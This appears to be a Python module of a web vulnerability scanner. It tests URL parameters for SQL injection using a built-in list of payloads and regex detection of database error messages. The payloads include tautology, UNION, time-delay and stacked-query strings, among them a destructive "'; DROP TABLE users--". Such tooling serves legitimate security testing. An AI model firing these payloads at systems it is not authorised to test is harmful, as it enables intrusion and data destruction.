"""
SQL Injection Scanner Module
Intelligently tests for SQL injection vulnerabilities
"""

import re
import random
from typing import List, Dict

class SQLInjectionScanner:
    """Smart SQL Injection vulnerability scanner"""

    def __init__(self, parent_scanner):
        self.scanner = parent_scanner
        self.name = "SQL Injection Scanner"
        self.payloads = self.load_smart_payloads()

    def load_smart_payloads(self) -> List[str]:
        """Load and select smart SQL injection payloads"""
        payload_files = {
            'generic': 'generic.txt',
            'mysql': 'mysql.txt',
            'postgresql': 'postgresql.txt',
            'mssql': 'mssql.txt',
            'oracle': 'oracle.txt'
        }

        smart_payloads = [
            # Time-based detection payloads
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--",

            # Error-based detection
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",

            # Boolean-based blind
            "' AND '1'='1",
            "' AND '1'='2",
            "1' AND '1'='1",
            "1' AND '1'='2",

            # Stacked queries
            "'; DROP TABLE users--",
            "1; SELECT * FROM users--",
        ]

        # Try to load additional payloads from files
        try:
            with open('generic.txt', 'r', encoding='utf-8', errors='ignore') as f:
                file_payloads = [line.strip() for line in f.readlines()[:50]]
                smart_payloads.extend(random.sample(file_payloads, min(20, len(file_payloads))))
        except:
            pass

        return smart_payloads

    def detect_sql_errors(self, response_text: str) -> bool:
        """Detect SQL error messages in response"""
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"SQLITE_ERROR",
            r"syntax error.*unexpected",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
        ]

        for pattern in sql_errors:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_parameter(self, url: str, param: str, value: str) -> List[Dict]:
        """Test a single parameter for SQL injection"""
        vulnerabilities = []

        # Get baseline response
        baseline_resp = self.scanner.smart_request(url, params={param: value})
        if not baseline_resp:
            return vulnerabilities

        baseline_length = len(baseline_resp.text)
        baseline_time = baseline_resp.elapsed.total_seconds()

        # Test each payload
        for payload in self.payloads[:30]:  # Limit to avoid too many requests
            test_value = value + payload
            test_resp = self.scanner.smart_request(url, params={param: test_value})

            if not test_resp:
                continue

            # Check for SQL errors
            if self.detect_sql_errors(test_resp.text):
                vulnerabilities.append({
                    'type': 'SQL Injection (Error-based)',
                    'severity': 'HIGH',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'description': f'SQL error detected in parameter "{param}"',
                    'evidence': self.extract_error(test_resp.text)
                })
                break

            # Check for time-based SQLi
            response_time = test_resp.elapsed.total_seconds()
            if response_time > baseline_time + 4:  # 4+ second delay
                if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload:
                    vulnerabilities.append({
                        'type': 'SQL Injection (Time-based Blind)',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'description': f'Time-based SQL injection in parameter "{param}"',
                        'evidence': f'Response delayed by {response_time - baseline_time:.2f} seconds'
                    })
                    break

            # Check for boolean-based SQLi
            if abs(len(test_resp.text) - baseline_length) > 100:
                if "AND '1'='1" in payload or "AND '1'='2" in payload:
                    vulnerabilities.append({
                        'type': 'SQL Injection (Boolean-based Blind)',
                        'severity': 'HIGH',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'description': f'Boolean-based SQL injection in parameter "{param}"',
                        'evidence': f'Response length difference: {abs(len(test_resp.text) - baseline_length)} bytes'
                    })
                    break

        return vulnerabilities

    def extract_error(self, text: str) -> str:
        """Extract SQL error message from response"""
        error_patterns = [
            r"(SQL syntax.*)",
            r"(MySQL.*error.*)",
            r"(PostgreSQL.*ERROR.*)",
            r"(ORA-\d+.*)",
        ]

        for pattern in error_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)[:200]
        return "SQL error detected"

    def scan(self) -> List[Dict]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []

        # Parse URL and extract parameters
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(self.scanner.target)
        params = parse_qs(parsed.query)

        if not params:
            # Try common parameters
            test_params = ['id', 'user', 'page', 'category', 'search', 'q', 'product']
            for param in test_params:
                test_url = f"{self.scanner.target}?{param}=1"
                resp = self.scanner.smart_request(test_url)
                if resp and resp.status_code == 200:
                    vulns = self.test_parameter(self.scanner.target, param, '1')
                    vulnerabilities.extend(vulns)
        else:
            # Test existing parameters
            for param, values in params.items():
                value = values[0] if values else '1'
                vulns = self.test_parameter(self.scanner.target, param, value)
                vulnerabilities.extend(vulns)

        return vulnerabilities
